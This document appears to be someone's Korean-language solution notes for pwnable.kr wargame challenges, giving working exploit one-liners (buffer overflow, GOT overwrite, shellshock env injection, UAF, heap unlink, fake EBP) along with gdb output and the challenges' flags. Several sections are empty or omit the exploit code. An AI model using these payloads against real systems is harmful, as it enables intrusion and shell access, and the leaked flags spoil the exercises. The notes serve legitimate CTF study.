[Pwnable]

set disassembly-flavor intel

[fd] ./fd 4660 
LETMEWIN

Flag: mommy! I think I know what a file descriptor is!! 

[collision] ./col `python -c 'print "\xc8\xce\xc5\x06" * 4 + "\xcc\xce\xc5\x06"'`

Flag: daddy! I just managed to create a hash collision :)

Hashcode: 0x21DD09EC

p/x 0x21DD09EC/5
$1 = 0x6c5cec8

p/x 0x6c5cec8 * 5
$1 = 0x21dd09e8

0x21DD09EC/5 =(0x6c5cec8 * 5 + 4)

[bof] (python -c 'print "A" * 52 + "\xbe\xba\xfe\xca"'; cat) | nc pwnable.kr 9000

STACK 구조 
Dummy(28) + overflowme(32) + Dummy(12) + SFP(4) + RET(4) + key(4) 

[flag] x/s 0x00496628

Flag: UPX...? sounds like a delivery service :)
xxd flag
Unpacking command : upx -d flag
gdb -q flag 

[passcode] (python -c 'print "A" * 96 +"\x04\xa0\x04\x08" + "134514147"';cat) | ./passcode

Flag: Sorry mom.. I got confused about scanf usage :(
name 입력 
0x08048643 <+58>:	lea    edx,[ebp-0x70]

Passcode1 입력
0x0804857c <+24>:	mov    edx,DWORD PTR [ebp-0x10]

시작 주소 차이 값: 0x60 (= 96) 이므로 4bytes가 겹친다. 

PLT : 외부 프로시저를 연결해주는 테이블. PLT를 통해 다른 라이브러리에 있는 프로시저를 호출해 사용할 수 있다.
GOT : PLT가 참조하는 테이블. 프로시저들의 주소가 들어있다.

(gdb) disas 0x8048430
Dump of assembler code for function fflush@plt:
   0x08048430 <+0>:	jmp    DWORD PTR ds:0x804a004
   0x08048436 <+6>:	push   0x8
   0x0804843b <+11>:	jmp    0x8048410
End of assembler dump.

fflush PLT:  0x8048430

fflush GOT address: 0x804a004  

System address: 0x080485e3

passcode1 변수의 주소에 저 값을 연결시켜 놓으면 scanf로 입력받을 때 fflush 함수의 실행을 조작할 수 있게 됩니다.

PLT & GOT 설명 

https://bpsecblog.wordpress.com/2016/03/07/about_got_plt_1/

https://bpsecblog.wordpress.com/2016/03/09/about_got_plt_2/

[random] 
random@pwnable:~$ ./random
3039230856
Good!
Mommy, I thought libc random is unpredictable...

Flag: Mommy, I thought libc random is unpredictable...

(gdb) b *0x0000000000400606
Breakpoint 1 at 0x400606
(gdb) i r eax
eax            0x6b8b4567	1804289383
(gdb) p 0x6b8b4567
$1 = 1804289383

rand()값: 1804289383

(gdb) p/d 0xdeadbeef
$4 = 3735928559

(gdb) p/d 1804289383 ^ 3735928559
$5 = 3039230856

[input] 

—————————


[mistake] 
mistake@pwnable:~$ ./mistake 
do not bruteforce...
1111111111
input password : 0000000000
Password OK
Mommy, the operator priority always confuses me :(

Flag: Mommy, the operator priority always confuses me :(

if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0)

< 연산이 먼저 실행되어 false 값인 0이 fd 에 들어가게 된다. 

if(!(len=read(fd,pw_buf,PW_LEN) > 0))

그로 인해, read(0, pw_buf, PW_LEN) 이 실행되어 standard input을 실행한다. 

그리하여, pw_buf의 값이 pw_buf2가 xor 연산한 값과 같으면 flag 실행 가능 

[shellshock] 
shellshock@pwnable:~$ env x='() { :; }; echo() { cat flag; }' ./shellshock
only if I knew CVE-2014-6271 ten years ago..!!

Flag: only if I knew CVE-2014-6271 ten years ago..!!

[coin1] 

[blackjack]

[lotto]
 

Flag: sorry mom... I FORGOT to check duplicate numbers... :(

Lotto.c 코드는 숫자 중복 확인을 하지 않는다. 그렇기에, 같은 숫자만 반복해서 입력을 하는 것이 Flag를 얻기 쉽다. 

[cmd1]

[cmd2]




 
[uaf]
(python -c ‘print “\x68\x15\x40\x00”’) > /tmp/test_t
./uaf 4 /tmp/test_t
3
2
2
1
Flag: yay_f1ag_aft3r_pwning

Break case 1
 
 

Man->introduce(); 
Woman->introduce() ;

main+272 부분 (rax: give_shell() 주소) (rax + 8: introduce() 주소) 

 

0x401570 이 0x0040117a 주소를 가리키므로, 0x401568 + 0x8 = 0x401570 
즉, 0x401570 대신 0x401568 을 넣어 give_shell() 함수가 실행할 수 있도록 해준다. 


[memcpy]

nc pwnable.kr 9022

64보다 작은 경우에는 slow_memcpy가 실행되어 값의 변동이 없다., 하지만 64보다 크거나 같은 경우에는 fast_memcpy가 실행되어 (16의 배수) + 8 값 해줘야 한다. 

 

[asm]

 
[unlink]

 

Flag: conditional_write_what_where_from_unl1nk_explo1t

(gdb) p shell
$1 = {<text variable, no debug info>} 0x80484eb <shell>

 

0x0856c428: A의 fd -> B
0x0856c440: B의 fd -> C
0x0856c410:  B의 bk -> A
0x0856c428: C의 bk -> B 

A <-> B <-> C 

 

B 가 unlink 되면 원래대로 라면 A <-> C 와 같은 형태로 변환되게 되는데
unlink 되기 전에 Heap Overflow 를 통해 shell() 함수의 주소를 넣고 dummy 값으로 채운 후 B의 fd 와 bk를 조작하면 공격이 가능하다. 

위 부분을 보면, ecx-0x4 를 리턴하는 것을 볼 수 있다. 여기서, 위를 보면 알 수 있듯이 ecx는 ebp-0x4 이다. 이를 고려하여, shell 함수를 리턴 시키기 위해서는 esp가 heap address + 8을 가리키고 있어야하기에, heap address + 12가 [ebp - 0x4]에 존재해야한다.

즉, B의 fd 값에 heap + 12, B의 bk 에 ebp - 4 를 덮어쓰게 되면 shell 함수로 리턴하도록 할 수 있다. 

EBP 값 구하기  
b *main + 208 
i r
Stack 주소 - ebp 주소 = 0x14 (=20) 
Stack 주소 + 20 = EBP 

[blukat] 

blukat.c 코드를 보면, strcmp(password, buf) 를 통해 패스워드와 buf를 비교함을 알 수 있다.
 

 
GDB를 통해 분석을 해보면, main+110 부분을 호출하기 전, 아래와 같은 작업이 진행됨을 볼 수 있다. 
mov rsi, rax 
mov edi, 0x6010a0

이 부분은 strcmp에 인자를 전달하기 위한 작업임을 예상할 수 있다. 
그리하여, rsi 에는 입력한 buf가 저장되고, edi 에는 password가 저장된다. 

 
위와 같이, 해당 주소가 가진 문자열을 출력해보면 “cat: password: Permission denied\n”가 password 임을 알 수 있다. 

 
password를 얻었으니, 이와 같이 실행시켜 패스워드를 입력해주면 Flag 를 획득할 수 있다.

[horcruxes]

 

Flag: Magic_spell_1s_4vad4_K3daVr4!

 

 
ROP 기법을 사용하여 A()~G() 함수를 호출하여 a~g 값들을 알아낸 후 ropme() 함수를 호출하여 sum 값을 입력하여 flag 획득 

Exploit.py 코드 작성 

 
[simple_login] 

 

우선 main 을 살펴보면, 사용자 입력을 받은 후, Base64Decode() 함수를 거쳐서 decoding 한다. Decoding 된 값이 0xd 보다 작으면, memcpy() 함수를 통해,  input(0x0811eb40) 주소에 decoding 된 값의 크기만큼 local_38을 copy시킨다. 이후 auth()함수를 호출한다. 이 때, auth() 함수 호출 이후 반환 되는 값이 1과 동일하면 correct() 함수가 실행된다. 

다음으로, auth() 함수에 대해 자세히 살펴보자. 

 

auth() 함수는 auStack12에 input(0x0811eb40) 값을 copy시키고, md5 형태로 암호화 한 후 “f87cd601aa7fedca99018a8be88eda34”와 비교하여 리턴한다. 여기서 만일 “f87cd601aa7fedca99018a8be88eda34” 와 md5에 의해 암호화된 값이 동일하다면 true를 반환하게 된다. 

여기서 주목할 점은, auth()함수에 memcpy() 부분이다. input(0x0811eb40) 값을 스택에 쓰는 과정에서 길이 제한 없이 복사하면서 EBP를 덮을 수 있는 취약점이 발생하게 되는 것이다. 

그리하여, Fake EBP 공격을 시도해보자. 
우선, payload의 길이는 0xd (=13) 보다 작아야하고, auth()함수에서 EBP를 input(0x0811eb40) 주소로 덮어씌운다. 그리하여, payload를 작성해보면 아래와 같이 작성할 수 있다. 
correct()함수에 system(“/bin/sh”)(4)* 2 + input주소(4) 

 

system(“/bin/sh”)함수의 주소는 0x0849278 이고, input (0x0811eb40) 이다. 

[파이썬 코드]
[otp] 

Flag: Darn... I always forget to check the return value of fclose() :(

checksec --file ./otp

 

파일을 확인해보니, 버퍼 오버플로를 막기 위해 스택의 버퍼와 제어 데이터 사이에 위치한 값들인 Canary 가 발견되었고, 
ulimit command 
시스템에서 사용 가능한 자원이 한정되어있기 때문에 자원 한도를 설정하기 위한 명령어 

[옵션][출처] 
-a : 모든 제한 사항을 보여준다.
-c : 최대 코어 파일 사이즈
-d : 프로세스 데이터 세그먼트의 최대 크기
-f  : shell에 의해 만들어질 수 있는 파일의 최대 크기
-s : 최대 스택 크기
-p : 파이프 크기
-n : 오픈 파일의 최대수
-u : 프로세스 최대수
-v : 최대 가상메모리의 량

 

이 부분을 보면 otp[1] 값을 fname 파일에 쓰고, 다시 fname 값을 읽어와 passcode에 값을 저장함을 알 수 있다. 

하지만, 만약 파일을 쓰려고 할 때 사용가능한 자원을 제한하면 어떻게 될까? 

 
이와 같이, fwrite(&otp[1], 8, 1, fp); 에서 SIGXFSZ 시그널이 발생하며 파일을 쓸 수 없게 된다. 그럼 이 때, passcode 값은 어떻게 될까? 

passcode는 파일에서 값을 읽어 저장하는데, 위와 같은 과정으로 파일을 읽어 값을 저장하게 되면, passcode에는 0 값이 들어가게 된다. 

그리하여, argv[1] 값을 0 값으로 전달해주게 되면 Flag 를 획득할 수 있게 되는 것이다. 

 

이와 같이 Flag 를 획득할 수 있다.

[dragon] 

undefined4 main(void)
{
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  puts("Welcome to Dragon Hunter!");
  PlayGame();
  return 0;
}

void PlayGame(void)
{
  int iVar1;
  
  while( true ) {
    while( true ) {
      puts("Choose Your Hero\n[ 1 ] Priest\n[ 2 ] Knight");
      iVar1 = GetChoice();
      if ((iVar1 != 1) && (iVar1 != 2)) break;
      FightDragon(iVar1);
    }
    if (iVar1 != 3) break;
    SecretLevel();
  }
  return;
}

이 부분을 보면 1 또는 2를 입력하면 FightDragon() 함수가 실행되고, 만약 3을 입력하게 되면 SecretLevel() 함수가 실행됨을 알 수 있다. 

void SecretLevel(void)

{
  int iVar1;
  int in_GS_OFFSET;
  char local_1a [10];
  int local_10;
  
  local_10 = *(int *)(in_GS_OFFSET + 0x14);
  printf("Welcome to Secret Level!\nInput Password : ");
  __isoc99_scanf(&DAT_0804932f,local_1a);
  iVar1 = strcmp(local_1a,"Nice_Try_But_The_Dragons_Won\'t_Let_You!");
  if (iVar1 != 0) {
    puts("Wrong!\n");
                    /* WARNING: Subroutine does not return */
    exit(-1);
  }
  system("/bin/sh");
  if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

우선, SecretLevel() 함수를 보면 local_1a 에 입력을 받는다. 이 때, local_1a와 Nice_Try_But_The_Dragons_Won\'t_Let_You!" 문자열이 동일하면 system(“/bin/sh”) 을 실행시킬 수 있다.  

하지만, 자세히보면 "Nice_Try_But_The_Dragons_Won\'t_Let_You!" 문자열은 40bytes 임을 알 수 있다. 즉, 10 bytes 만으로 해당 문자열을 입력할 수 없으니 다른 방법을 시도해야했다. 

혹시 모르니, system(“/bin/sh”); 의 주소를 알아두는게 좋을 것 같다. 
 
system(“/bin/sh”) 주소: 0x08048dbf

그 다음 FightDragon 함수를 살펴보자. 

void FightDragon(int param_1)

{
  undefined4 *__ptr;
  code **ppcVar1;
  void *pvVar2;
  int local_1c;
  
  __ptr = (undefined4 *)malloc(0x10);
  ppcVar1 = (code **)malloc(0x10);
  if ((Count & 1) == 0) {
    Count = Count + 1;
    ppcVar1[1] = (code *)0x0;
    *(undefined *)(ppcVar1 + 2) = 0x32;
    *(undefined *)((int)ppcVar1 + 9) = 5;
    ppcVar1[3] = (code *)0x1e;
    *ppcVar1 = PrintMonsterInfo;
    puts("Baby Dragon Has Appeared!");
  }
  else {
    Count = Count + 1;
    ppcVar1[1] = (code *)0x1;
    *(undefined *)(ppcVar1 + 2) = 0x50;
    *(undefined *)((int)ppcVar1 + 9) = 4;
    ppcVar1[3] = (code *)0xa;
    *ppcVar1 = PrintMonsterInfo;
    puts("Mama Dragon Has Appeared!");
  }
  if (param_1 == 1) {
    *__ptr = 1;
    __ptr[1] = 0x2a;
    __ptr[2] = 0x32;
    __ptr[3] = PrintPlayerInfo;
    local_1c = PriestAttack(__ptr,ppcVar1);
  }
  else {
    if (param_1 != 2) {
      return;
    }
    *__ptr = 2;
    __ptr[1] = 0x32;
    __ptr[2] = 0;
    __ptr[3] = PrintPlayerInfo;
    local_1c = KnightAttack(__ptr,ppcVar1);
  }
  if (local_1c == 0) {
    puts("\nYou Have Been Defeated!");
  }
  else {
    puts("Well Done Hero! You Killed The Dragon!");
    puts("The World Will Remember You As:");
    pvVar2 = malloc(0x10);
    __isoc99_scanf(&DAT_08049108,pvVar2);
    puts("And The Dragon You Have Defeated Was Called:");
    (**ppcVar1)(ppcVar1);
  }
  free(__ptr);
  return;
}

이 코드를 보면서, 어떻게 system(“/bin/sh”); 이 있는 주소로 return 할지 고민하던 중 함수의 밑에 부분에 pvVar2 = malloc(0x10); 부분을 보고,
UAF(Use After Free) 공격을 이용하면 될 것 같다는 생각이 들었다. 

그 이유는, pvVar2 입력을 받은 후, (**ppcVar1)(ppcVar1); 드래곤 정보를 출력하는 함수가 다시 호출되고 있는데, 이 부분에서 전에 free 되었던 영역에 pvVar2의 주소가 들어간다면, (**ppcVar1)(ppcVar1); 이 부분이 드래곤 정보를 호출하는 함수인줄 알고 주소를 호출하게 되면서 UAF 공격이 실행될 수 있기 때문이다. 

그런데, 구조상 히어로가 드래곤과 일방적으로 싸워서는 절대 이길 수가 없다… 그러던 중 드래곤의 체력이 바이트 단위로 설정되어있다는 것을 알게되었고, -127 ~ 127 사이의 값만 가질 수 있다는 점을 이용하여, Priest로 드래곤을 공격하지 않고, 방어만 하면 드래곤이 한 턴당 체력이 증가해 127을 넘는 순간 히어로가 이기게 된다. 

그렇게 드래곤을 잡은 후, 아까 기억해둔 system(“/bin/sh”) 주소(0x08048dbf) 를 입력해주면, 이 같은 크기의 메모리 할당이 되었기에, 전에 사용했던 그 주소가 다시 사용되며 system(“/bin/sh”); 이 호출된다. 

리하여, Exploit 코드를 작성해보면 아래와 같이 나타낼 수 있다. 

Flag: MaMa, Gandhi was right! :)

 

[echo1] 

undefined8 main(void)

{
  undefined8 *puVar1;
  EVP_PKEY_CTX *ctx;
  uint local_2c;
  undefined4 local_28;
  undefined4 uStack36;
  undefined8 local_20;
  undefined8 local_18;
  
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,1,0);
  o = (undefined8 *)malloc(0x28);
  o[3] = greetings;
  o[4] = byebye;
  printf("hey, what\'s your name? : ");
  __isoc99_scanf(&DAT_00400bbe,&local_28);
  puVar1 = o;
  *o = CONCAT44(uStack36,local_28);
  puVar1[1] = local_20;
  puVar1[2] = local_18;
  id = local_28;
  getchar();
  func._0_8_ = echo1;
  func._8_8_ = echo2;
  func._16_8_ = echo3;
  local_2c = 0;
  do {
    while( true ) {
      while( true ) {
        puts("\n- select echo type -");
        puts("- 1. : BOF echo");
        puts("- 2. : FSB echo");
        puts("- 3. : UAF echo");
        puts("- 4. : exit");
        printf("> ");
        ctx = (EVP_PKEY_CTX *)&DAT_00400c18;
        __isoc99_scanf(&DAT_00400c18,&local_2c);
        getchar();
        if (3 < local_2c) break;
        (**(code **)(func + (ulong)(local_2c - 1) * 8))();
      }
      if (local_2c == 4) break;
      puts("invalid menu");
    }
    cleanup(ctx);
    printf("Are you sure you want to exit? (y/n)");
    local_2c = getchar();
  } while (local_2c != 0x79);
  puts("bye");
  return 0;
}

undefined8 echo1(undefined8 param_1,undefined8 param_2)

{
  char local_28 [32];
  
  (**(code **)(o + 0x18))(o,param_2,*(code **)(o + 0x18));
  get_input(local_28,0x80);
  puts(local_28);
  (**(code **)(o + 0x20))(o);
  return 0;
}

echo1 함수를 보면, get_input(); 함수를 통해 local_28이 입력을 받는데, 32 bytes 보다 큰 0x80 만큼 입력을 받을 수 있다. 이 부분에서, BOF 공격이 가능하다는 사실을 알 수 있다. 

checksec --file echo1 명령을 통해 메모리 보호 기법이 사용되고 있는지 확인해보자. 

 

Canary, NX bit, PIE 등 다양한 메모리 기법이 사용되고 있지 않으므로, Buffer Overflow 공격을 수행할 수 있을 것 같다. 

 
우선 A 40개를 입력해보니, echo1 함수의 ret 부분에 break를 걸어 return 주소를 확인해보았더니 0x00400a6c 로 리턴 주소가 overwrite 되지 않았다. 

 
다음으로 A 44개를 입력해보니, echo1함수의 리턴 주소가 잘 덮여쓰여진 것을 확인할 수 있었다. 이를 통해, Dummy(40) + RET(8) 로 Payload 를 작성하면 될 것 같다. 

 

자세한 구조는 64 bit 를 사용하고 있으므로, local_28(32) + SFP(8) + RET(8) 로 구성되어 있음을 알 수 있다. 

그럼 이제 SHELLCODE 를 삽입할 부분을 찾아보자. 

 

우선 SHELLCODE를 넣을 곳을 찾아보던 중, bss 영역에 위치한 id 가 위치한 주소를 확인해보니 4 bytes 밖에 값이 들어가지 않아 id에 shellcode를 넣는 건 불가능하다. 

그럼, 리턴 주소를 id 주소로 하고 id에서 jmp esp 명령을 실행하면 어떻게 될까?  

Payload = Dummy(40) + id 주소(8) + SHELLCODE 

페이로드를 위와 같이 작성하게 되면, ID 주소로 리턴한 후,  jmp esp 명령을 실행하면 SHELLCODE를 가리키게 될 것이다. 

이를 Exploit 코드로 작성해보면, 아래와 같이 작성할 수 있다. 

[코드] 

실행 결과, 잘 작동하여 Flag 를 획득할 수 있다. 

 
Flag: H4d_som3_fun_w1th_ech0_ov3rfl0w

